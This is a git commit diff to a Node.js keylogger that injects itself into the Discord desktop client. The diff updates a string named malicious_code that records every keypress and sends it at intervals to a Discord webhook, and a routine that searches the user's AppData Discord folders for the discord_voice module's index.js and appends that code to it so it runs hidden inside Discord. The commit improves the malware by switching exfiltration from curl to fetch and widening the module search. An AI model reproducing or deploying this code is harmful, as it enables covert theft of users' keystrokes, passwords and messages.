8a1ae9d4f254903cb950504155ee839019574a1f
I2rys <i2rys@protonmail.com>
2021-09-10 17:29:16 -0700

    Bugs fixed & upgraded!

--- Keylogger/index.js
+++ Keylogger/index.js
@@ -3,43 +3,53 @@ const Fs = require("fs")
 const Os = require("os")
 
 //Variables
-var malicious_code = `var keys = "";
-const send_time = 10000;
+var malicious_code = `\nvar keys = ""
+const send_time = 10000
 document.onkeypress = function(e) {
-    get = window.event?event:e;
-    key = get.keyCode?get.keyCode:get.charCode;
-    key = String.fromCharCode(key);
-    keys+=key;
+    get = window.event?event:e
+    key = get.keyCode?get.keyCode:get.charCode
+    key = String.fromCharCode(key)
+    keys+=key
 }
 
 window.setInterval(function(){
-    if(keys.length>0) {
-        ChildProcess.exec('curl -X POST -H "Content-Type: application/json" -d "{\\"content\\":\\"' + keys + '\\"}" discordwebhook_link', function(err, stdout, stderr){
-            if(err){ return }
-			
-			keys = "";
-        })
+    if(keys.length >0 ) {
+        fetch("discordwebhook_link", {
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json"
+			},
+			body: JSON.stringify({ content: keys })
+		}).then(data =>{
+			keys = ""
+		})
     }
-}, send_time);`
+}, send_time)`
 
 //Main
 if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
     const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
 
     Directories().forEach(directory =>{
+        const Directories2 = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
+
         if(directory.indexOf("app") != -1){
-            Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, "utf8", function(err, data){
-                if(err){
-                    process.exit()
+            Directories2().forEach(directory2 =>{
+                if(directory2.indexOf("discord_voice") != -1){
+                    Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
+                        if(err){
+                            process.exit()
+                        }
+                
+                        if(data.indexOf("fetch(") != -1){
+                            process.exit()
+                        }
+                
+                        data += `\n${malicious_code}`
+                
+                        Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
+                    })
                 }
-        
-                if(data.indexOf("curl") != -1){
-                    process.exit()
-                }
-        
-                data += `\n${malicious_code}`
-        
-                Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, data, "utf8")
             })
         }
     })
